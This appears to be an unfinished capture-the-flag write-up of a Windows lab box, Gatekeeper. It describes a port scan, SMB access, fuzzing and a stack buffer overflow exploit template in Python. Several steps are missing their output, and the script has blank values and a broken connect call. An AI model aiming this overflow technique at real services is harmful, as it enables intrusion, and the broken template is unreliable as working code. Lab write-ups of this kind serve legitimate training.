Today's challenge appears to be a mid-tier windows box with not much to go on. The only 2 questions are what are the user and root flags.

Task1 - Approach the Gates
---------------------------------
Power up the box.

Task2 - Defeat the Gatekeeper and pass through the fire.
--------------------------------

Starting off with a full port scan:


Found an interesting open port.

Logging in with SMB I  see'

Try some fuzzing:

Crash point is:

Downloaded gatekeeper.exe

Putting it on my local windows box so I can examine and test it with Immunity Debugger.

Here is a test exploit script:

```
root@ip-10-10-70-233:~# cat expoloit.py 
import socket

ip = "10.10.12.148"
port = 

offset =
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
eol = "\r\n"

buffer = overflow + retn + padding + payload + eol

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect(ip, port)
    print("Sending exploit...")
    s.send(buffer)
    print("Done!")
except:
    print("Could not connect.")
    
```
